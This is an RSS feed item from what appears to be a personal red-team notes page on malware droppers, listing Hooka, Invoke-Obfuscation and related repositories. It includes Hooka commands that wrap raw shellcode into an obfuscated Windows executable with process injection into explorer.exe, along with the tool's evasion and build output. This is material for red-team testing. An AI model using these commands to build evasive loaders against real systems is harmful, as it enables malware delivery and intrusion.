<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) â€“ Malware Dropper Testing</title><link>https://fyx.me/tags/malware-dropper-testing/</link><description>Recent content in Malware Dropper Testing on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://fyx.me/tags/malware-dropper-testing/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://fyx.me/bazaar/c2-and-red-team-tools/malware-droppers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/c2-and-red-team-tools/malware-droppers/</guid><description>
&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-indigo-200 hx-bg-indigo-100 hx-text-indigo-900 dark:hx-border-indigo-200/30 dark:hx-bg-indigo-900/30 dark:hx-text-indigo-200">
&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Important&lt;/p>
&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>Use open source malware droppers when playing in testing environments&amp;hellip; You don&amp;rsquo;t want to burn your own dropper when playing around.&lt;/p>
&lt;/div>
&lt;/div>
&lt;/div>
&lt;h3>&lt;a href="https://github.com/D3Ext/Hooka.git" target="_blank" rel="noopener">Hooka&lt;/a>&lt;span class="hx-absolute -hx-mt-20" id="hookahttpsgithubcomd3exthookagit">&lt;/span>
&lt;a href="#hookahttpsgithubcomd3exthookagit" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
&lt;li>Can be run in Linux and generate Windows binaries (cross platform compilation)&lt;/li>
&lt;li>Golang&lt;/li>
&lt;/ul>
&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># simplest command&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># the more shit you add the buggier it might be... and less likely to run&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># glhf&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe --proc explorer.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _ _ _ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> ___ ___ &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> __ __ _ &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> / _ &lt;span class="se">\ &lt;/span> / _ &lt;span class="se">\ &lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ / / _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> _ &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &amp;lt; &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>__/ &lt;span class="se">\_&lt;/span>__/ &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_\ &lt;/span> &lt;span class="se">\_&lt;/span>_,_&lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Obtaining shellcode from /home/lo/webserver/smb.x64.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; Shellcode is in raw format
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Defining evasion techniques...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using suspendedprocess technique to execute shellcode
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Obfuscating variables and functions...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Compiling shellcode loader...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; Payload format is &lt;span class="nb">set&lt;/span> to EXE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; go build -o imdone.exe loader.go
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; &lt;span class="m">3154432&lt;/span> bytes written to imdone.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Loader file entropy: 6.9330213473661955
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Checksums:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; MD5: 6666b187280d31537b083c69631b636c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; SHA1: 64ff907b7c9d94564ce5857145dd70d8b4761044
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;gt; SHA256: d9b5fc90dcd569ae2f00b7dc7bb1ddeae28e1cacc201628afa7d809061dfe561
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Shellcode loader has been successfully generated&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
&lt;button
class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
title="Copy code"
>
&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
&lt;/button>
&lt;/div>
&lt;/div>
&lt;h3>&lt;a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">Invoke-Obfuscation&lt;/a>&lt;span class="hx-absolute -hx-mt-20" id="invoke-obfuscationhttpsgithubcomdanielbohannoninvoke-obfuscation">&lt;/span>
&lt;a href="#invoke-obfuscationhttpsgithubcomdanielbohannoninvoke-obfuscation" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;a href="https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide" target="_blank" rel="noopener">https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://x.com/dmcxblue/status/1879176230098157962?t=bhHdazl7dNhn39P3g5jVpw&amp;amp;s=19" target="_blank" rel="noopener">https://x.com/dmcxblue/status/1879176230098157962?t=bhHdazl7dNhn39P3g5jVpw&amp;s=19&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3>References&lt;span class="hx-absolute -hx-mt-20" id="references">&lt;/span>
&lt;a href="#references" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;a href="https://github.com/mttaggart/rustyneedle" target="_blank" rel="noopener">https://github.com/mttaggart/rustyneedle&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/joaoviictorti/RustRedOps" target="_blank" rel="noopener">https://github.com/joaoviictorti/RustRedOps&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>